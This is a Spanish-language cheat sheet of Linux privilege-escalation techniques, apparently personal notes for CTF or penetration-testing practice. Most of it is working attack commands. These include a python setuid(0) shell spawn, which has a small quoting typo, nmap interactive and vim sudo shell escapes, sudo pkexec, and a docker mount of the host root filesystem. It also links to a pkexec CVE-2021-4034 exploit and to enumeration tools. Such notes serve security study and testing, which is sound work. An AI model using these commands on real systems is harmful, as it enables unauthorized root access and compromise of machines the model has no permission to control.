### Primeras comprobaciones
#### Grupos de usuario
Ver si esta el usuario en algun grupo interesante, como el de docker

```bash
id
```
#### Ejecución de tareas como root
```bash
sudo -l
```
#### Permisos SUID y GUID
```bash
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null
```
#### Versión de sudo
con este comando podremos ver la versión de sudo, y se puede buscar alguna vulnerabilidad afectada a la versión.

```bash
sudo -V
```
#### Version del S.O
```bash
lsb_release -a
```
#### Version de kernel
```bash
uname -r
```


### Capabilities
```bash
getcap -r / 2>/dev/null
```

### Capability Setuid en python
si encontramos que python3 tiene la capability de setuid. con esta capability podemos ejecutar una shell cambiando la uid del usuario actual por "0" que es la de root.

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh)'
```

### Permisos SUID y GUID
```bash
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null
```

#### SUID en nmap
basta con lanzar nmap de forma interactiva
```bash
nmap --interactive
```

y luego lanzar
```bash
!bash -p
```
#### SUID pkexec
se puede utilizar el siguiente exploit, cuando pkexec tiene permisos SUID
[pkexec](https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py)

al compartirlo con la máquina y darle permisos de ejecución, nos preguntará si queremos usar el payload por defecto, escribimos **n** y aceptamos.

#### SUID Python
```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### SUDO -L
Si encontramos un binario que con ==sudo -l== vemos que podemos ejecutarlo como si fueramos el administrador, podemos buscar en ==GTFOBins==

#### Binario que podemos editar, y ejecutar como si fuéramos root

Con sudo -l vemos que se puede ejecutar como root, sus permisos nos deja editar el fichero, algo así ==rwxrwxrwx==. editamos dicho binario y le metemos el comando ==su -==.

#### VIM

Si encontramos vim con sudo -l. Abrimos vim
``` bash
sudo vim -c ':!/bin/sh'
```

#### Pkexec
con este binario con permisos SUID se ejecuta un CVE, pero cuando tenemos permisos para ejecutar como el propietario, se puede hacer:
```bash
sudo pkexec /bin/sh
```
### Docker
Pudiendo ejecutar docker sin ser root, se puede escalar privilegios y montar el sistema de ficheros de la maquina real en el contenedor de forma que podremos acceder a todo.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

>NOTA
>Seremos root en el contenedor, no en la máquina. Pero podremos acceder a todo el sistema de ficheros.

### Herramientas automatizadas escalada privilegios

#### LES (Linux exploit suggester)
[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
Herramienta que busca vulnerabilidades a nivel de kernel de linux

#### linPEAS
[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
Herramienta que busca posibles malas configuraciones en la maquina para intentar escalar privilegios